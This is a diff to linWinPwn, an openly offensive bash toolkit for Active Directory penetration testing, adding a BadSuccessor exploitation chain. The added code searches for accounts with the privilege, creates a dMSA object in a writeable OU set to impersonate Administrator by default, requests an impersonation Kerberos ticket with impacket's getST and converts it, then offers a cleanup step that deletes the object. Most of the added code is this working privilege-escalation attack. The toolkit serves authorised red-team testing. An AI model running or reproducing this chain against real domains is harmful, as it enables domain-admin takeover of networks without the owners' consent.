@@ -84,6 +84,8 @@ impacket_mssqlclient=$(which mssqlclient.py)
 if ! stat "${impacket_mssqlclient}" >/dev/null 2>&1; then impacket_mssqlclient=$(which impacket-mssqlclient); fi
 impacket_describeticket=$(which describeTicket.py)
 if ! stat "${impacket_describeticket}" >/dev/null 2>&1; then impacket_describeticket=$(which impacket-describeTicket); fi
+impacket_badsuccessor=$(which badsuccessor.py)
+if ! stat "${impacket_badsuccessor}" >/dev/null 2>&1; then impacket_badsuccessor=$(which impacket-badsuccessor); fi
 enum4linux_py=$(which enum4linux-ng)
 if ! stat "${enum4linux_py}" >/dev/null 2>&1; then enum4linux_py="$scripts_dir/enum4linux-ng.py"; fi
 bloodhound=$(which bloodhound-python)
@@ -154,7 +156,7 @@ print_banner() {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN}version 1.3.5 ${NC}
+      ${BLUE}linWinPwn: ${CYAN}version 1.3.6 ${NC}
       https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -3347,6 +3349,18 @@ badsuccessor_check() {
     echo -e "${BLUE}[*] Running BadSuccessor check against domain${NC}"
     run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} -M badsuccessor --log ${Vulnerabilities_dir}/ne_badsuccessor_output_${dc_domain}.txt" 2>&1
     echo -e ""
+    if ! stat "${impacket_badsuccessor}" >/dev/null 2>&1; then
+        echo -e "${RED}[-] Please verify the installation of impacket{NC}"
+    else
+        if [ "${nullsess_bool}" == true ]; then
+            echo -e "${PURPLE}[-] badsuccessor.py requires credentials${NC}"
+        else
+            if [ "${ldaps_bool}" == true ]; then ldaps_param="-method LDAPS"; else ldaps_param="-method LDAP"; fi
+            echo -e "${CYAN}[*] Searching for identities with BadSuccessor privileges${NC}"
+            run_command "${impacket_badsuccessor} ${argument_imp} -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS} ${ldaps_param} -action search" 2>&1 | tee -a "${Vulnerabilities_dir}/badsuccessor_search_${user_var}.txt"
+        fi
+    fi
+    echo -e ""
 }
 
 ###### mssql_checks: MSSQL scan
@@ -4185,7 +4199,7 @@ add_spn_constrained() {
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
             echo -e "${BLUE}[*] Adding SPNs of Domain Controller to owned computer account (msDS-AllowedToDelegateTo). Please specify target:${NC}"
-            echo -e "${CYAN}[*] Example: DC01 or FILE01 ${NC}"
+            echo -e "${CYAN}[*] Example: DC01 or FILE01${NC}"
             target_spn=""
             read -rp ">> " target_spn </dev/tty
             while [ "${target_spn}" == "" ]; do
@@ -4198,6 +4212,66 @@ add_spn_constrained() {
                 echo -e "${GREEN}[+] Adding DC SPNs successful! Run command below to generate impersonated ticket ${NC}"
                 echo -e "${impacket_getST} -spn '< HOST/${dc_FQDN} OR LDAP/${dc_FQDN} >' -impersonate ${dc_NETBIOS} ${domain}/'${target_spn}$':'< password of ${target_spn} >'"
             fi
+        fi
+    fi
+    echo -e ""
+}
+
+badsuccessor_adddmsa() {
+    if ! stat "${impacket_badsuccessor}" >/dev/null 2>&1; then
+        echo -e "${RED}[-] Please verify the installation of impacket{NC}"
+    else
+        if [ "${nullsess_bool}" == true ]; then
+            echo -e "${PURPLE}[-] badsuccessor.py requires credentials${NC}"
+        else
+            echo -e "${BLUE}[*] Please specify name of writeable OU:${NC}"
+            echo -e "${CYAN}[*] Example: OU=ServiceAccounts,DC=domain,DC=local${NC}"
+            read -rp ">> " target_ou </dev/tty
+            while [ "${target_ou}" == "" ]; do
+                echo -e "${RED}Invalid OU.${NC} Please specify name of OU:"
+                read -rp ">> " target_ou </dev/tty
+            done
+            dmsa_name="bad_DMSA"
+            target_dmsa="Administrator"
+            imp_dmsa="${user}"
+            echo -e "${BLUE}[*] Adding dMSA to writeable OU. Please specify name of dMSA object (press Enter to choose default value 'bad_DMSA'):${NC}"
+            read -rp ">> " dmsa_name_add </dev/tty
+            if [[ ! ${dmsa_name_add} == "" ]]; then dmsa_name="${dmsa_name_add}"; fi
+            echo -e "${BLUE}[*] Please specify name of admin to impersonate (press Enter to choose default value 'Administrator'):${NC}"
+            read -rp ">> " target_dmsa_temp </dev/tty
+            if [[ ! ${target_dmsa_temp} == "" ]]; then target_dmsa="${target_dmsa_temp}"; fi
+            echo -e "${BLUE}[*] Please specify name of user under your control (press Enter to choose default value current user):${NC}"
+            read -rp ">> " imp_dmsa_temp </dev/tty
+            if [[ ! ${imp_dmsa_temp} == "" ]]; then imp_dmsa="${imp_dmsa_temp}"; fi
+            if [ "${ldaps_bool}" == true ]; then ldaps_param="-method LDAPS"; else ldaps_param="-method LDAP"; fi
+            echo -e "${CYAN}[*] Adding dMSA named ${dmsa_name} to ${target_ou}${NC}"
+            run_command "${impacket_badsuccessor} ${argument_imp} -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS} ${ldaps_param} -action add  -dmsa-name '${dmsa_name}' -target-ou '${target_ou}' -target-account '${target_dmsa}' -principals-allowed '${imp_dmsa}'" 2>&1 | tee -a "${Modification_dir}/badsuccessor_adddmsa_${user_var}.txt"
+        fi
+    fi
+    echo -e ""
+}
+
+badsuccessor_deletedmsa() {
+    if ! stat "${impacket_badsuccessor}" >/dev/null 2>&1; then
+        echo -e "${RED}[-] Please verify the installation of impacket{NC}"
+    else
+        if [ "${nullsess_bool}" == true ]; then
+            echo -e "${PURPLE}[-] badsuccessor.py requires credentials${NC}"
+        else
+            echo -e "${BLUE}[*] Please specify name of writeable OU:${NC}"
+            echo -e "${CYAN}[*] Example: OU=ServiceAccounts,DC=domain,DC=local${NC}"
+            read -rp ">> " target_ou </dev/tty
+            while [ "${target_ou}" == "" ]; do
+                echo -e "${RED}Invalid OU.${NC} Please specify name of OU:"
+                read -rp ">> " target_ou </dev/tty
+            done
+            dmsa_name="bad_DMSA"
+            echo -e "${BLUE}[*] Removing dMSA from writeable OU. Please specify name of dMSA object (press Enter to choose default value 'bad_DMSA'):${NC}"
+            read -rp ">> " dmsa_name_delete </dev/tty
+            if [[ ! ${dmsa_name_delete} == "" ]]; then dmsa_name="${dmsa_name_delete}"; fi
+            if [ "${ldaps_bool}" == true ]; then ldaps_param="-method LDAPS"; else ldaps_param="-method LDAP"; fi
+            echo -e "${CYAN}[*] Removing dMSA named ${dmsa_name} from ${target_ou}${NC}"
+            run_command "${impacket_badsuccessor} ${argument_imp} -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS} ${ldaps_param} -action delete -dmsa-name '${dmsa_name}' -target-ou '${target_ou}'" 2>&1 | tee -a "${Modification_dir}/badsuccessor_deletedmsa_${user_var}.txt"
         fi
     fi
     echo -e ""
@@ -5454,6 +5528,7 @@ kerberos_menu() {
     echo -e "16) Privilege escalation from Child Domain to Parent Domain using raiseChild (requires: DA rights on child domain)"
     echo -e "17) Request impersonated ticket using Constrained Delegation rights (requires: authenticated session of account allowed for delegation, for example 'gmsa')"
     echo -e "18) Request impersonated ticket using Resource-Based Constrained Delegation rights (requires: authenticated session of SPN account allowed for RBCD)"
+    echo -e "19) Request TGS impersonated ticket using dMSA to exploit BadSuccessor (requires: authenticated session of account with BadSuccessor privileges)"
     echo -e "back) Go back"
     echo -e "exit) Exit"
 
@@ -5911,6 +5986,56 @@ kerberos_menu() {
         fi
         kerberos_menu
         ;;
+
+    19)
+        if [ "${pass_bool}" == true ] || [ "${hash_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
+            echo -e "${CYAN}[*] Requesting TGT for current user${NC}"
+            krb_ticket="${Credentials_dir}/${user}"
+            run_command "${netexec} ${ne_verbose} smb ${target} ${argument_ne} --generate-tgt ${krb_ticket} --log ${Credentials_dir}/getTGT_output_${user_var}.txt"
+            if stat "${krb_ticket}.ccache" >/dev/null 2>&1; then
+                echo -e "${GREEN}[+] TGT generated successfully:${NC} '$krb_ticket.ccache'"
+            elif [ "${noexec_bool}" == "false" ]; then
+                echo -e "${RED}[-] Failed to generate TGT${NC}"
+            fi
+        else
+            krb_ticket="${Credentials_dir}/${user}"
+            echo -e "${PURPLE}[-] Using Kerberos authentication! Skipping generation of TGT...${NC}"
+        fi
+
+        if ! stat "${impacket_getST}" >/dev/null 2>&1; then
+            echo -e "${RED}[-] getST.py not found! Please verify the installation of impacket${NC}"
+        else
+            if [ "${nullsess_bool}" == true ]; then
+                echo -e "${RED}[-] Requesting ticket using getST requires credentials${NC}"
+            else
+                dmsa_account=""
+                echo -e "${BLUE}[*] Please specify dMSA account name:${NC}"
+                echo -e "${CYAN}[*] Example: bad_DMSA${NC}"
+                read -rp ">> " dmsa_account </dev/tty
+                while [[ "${dmsa_account}" == "" ]]; do
+                    echo -e "${RED}Invalid name.${NC} Please specify dMSA account name:"
+                    read -rp ">> " dmsa_account </dev/tty
+                done
+                echo -e "${CYAN}[*] Requesting dMSA impersonation ticket${NC}"
+                current_dir=$(pwd)
+                cd "${Credentials_dir}" || exit
+                run_command "KRB5CCNAME=${krb_ticket}.ccache ${impacket_getST} ${domain}/${user}@${dc_FQDN} -k -no-pass -dc-ip ${dc_ip} -impersonate '${dmsa_account}$' -self -dmsa" | tee -a "${Credentials_dir}/getST_dmsa_output_${user_var}"
+                ticket_ccache_out="${dmsa_account}\$@krbtgt_${dc_domain^^}@${dc_domain^^}.ccache"
+                ticket_kirbi_out="${dmsa_account}\$@krbtgt_${dc_domain^^}@${dc_domain^^}.kirbi"
+                if stat "${Credentials_dir}/${ticket_ccache_out}" >/dev/null 2>&1; then
+                    run_command "${impacket_ticketconverter} './${ticket_ccache_out}' './${ticket_kirbi_out}'"
+                    echo -e "${GREEN}[+] TGS impersonating ${dmsa_account} generated successfully:${NC}"
+                    echo -e "'${Credentials_dir}/${ticket_ccache_out}'"
+                    echo -e "'${Credentials_dir}/${ticket_kirbi_out}'"
+                else
+                    echo -e "${RED}[-] Failed to request ticket${NC}"
+                fi
+                cd "${current_dir}" || exit
+            fi
+        fi
+        kerberos_menu
+        ;;
+
     back)
         main_menu
         ;;
@@ -6051,7 +6176,7 @@ vulns_menu() {
     echo -e "13) Run LDAPNightmare check"
     echo -e "14) Run sessions enumeration using netexec (reg-sessions)"
     echo -e "15) Check for unusual sessions"
-    echo -e "16) Check for BadSuccessor vuln using netexec"
+    echo -e "16) Check for BadSuccessor vuln using netexec and impacket"
     echo -e "back) Go back"
     echo -e "exit) Exit"
 
@@ -6431,6 +6556,8 @@ modif_menu() {
     echo -e "21) Modify userPrincipalName to perform Certificate impersonation (ESC10) (Requires: ${PURPLE}GenericWrite${NC} on user)"
     echo -e "22) Add Constrained Delegation rights - uac: TRUSTED_TO_AUTH_FOR_DELEGATION (Requires: ${PURPLE}SeEnableDelegationPrivilege${NC} rights)"
     echo -e "23) Add HOST and LDAP SPN entries of DC to computer with Constrained Deleg rights - msDS-AllowedToDelegateTo (Requires: ${PURPLE}Owner${NC} of computer)"
+    echo -e "24) Add dMSA to exploit BadSuccessor on Windows Server 2025 (Requires: ${PURPLE}GenericWrite${NC} on OU)"
+    echo -e "25) Remove dMSA to clean after exploiting BadSuccessor (Requires: ${PURPLE}GenericWrite${NC} on OU)"
     echo -e "back) Go back"
     echo -e "exit) Exit"
 
@@ -6548,6 +6675,16 @@ modif_menu() {
 
     23)
         add_spn_constrained
+        modif_menu
+        ;;
+
+    24)
+        badsuccessor_adddmsa
+        modif_menu
+        ;;
+
+    25)
+        badsuccessor_deletedmsa
         modif_menu
         ;;
 
@@ -6940,6 +7077,7 @@ config_menu() {
         if ! stat "${impacket_raiseChild}" >/dev/null 2>&1; then echo -e "${RED}[-] impacket's raiseChild is not installed${NC}"; else echo -e "${GREEN}[+] impacket's raiseChild is installed${NC}"; fi
         if ! stat "${impacket_changepasswd}" >/dev/null 2>&1; then echo -e "${RED}[-] impacket's changepasswd is not installed${NC}"; else echo -e "${GREEN}[+] impacket's changepasswd is installed${NC}"; fi
         if ! stat "${impacket_describeticket}" >/dev/null 2>&1; then echo -e "${RED}[-] impacket's describeTicket is not installed${NC}"; else echo -e "${GREEN}[+] impacket's describeticket is installed${NC}"; fi
+        if ! stat "${impacket_badsuccessor}" >/dev/null 2>&1; then echo -e "${RED}[-] impacket's badsuccessor is not installed${NC}"; else echo -e "${GREEN}[+] impacket's badsuccessor is installed${NC}"; fi
         if ! stat "${bloodhound}" >/dev/null 2>&1; then echo -e "${RED}[-] bloodhound is not installed${NC}"; else echo -e "${GREEN}[+] bloodhound is installed${NC}"; fi
         if ! stat "${ldapdomaindump}" >/dev/null 2>&1; then echo -e "${RED}[-] ldapdomaindump is not installed${NC}"; else echo -e "${GREEN}[+] ldapdomaindump is installed${NC}"; fi
         if ! stat "${netexec}" >/dev/null 2>&1; then echo -e "${RED}[-] netexec is not installed${NC}"; else echo -e "${GREEN}[+] netexec is installed${NC}"; fi
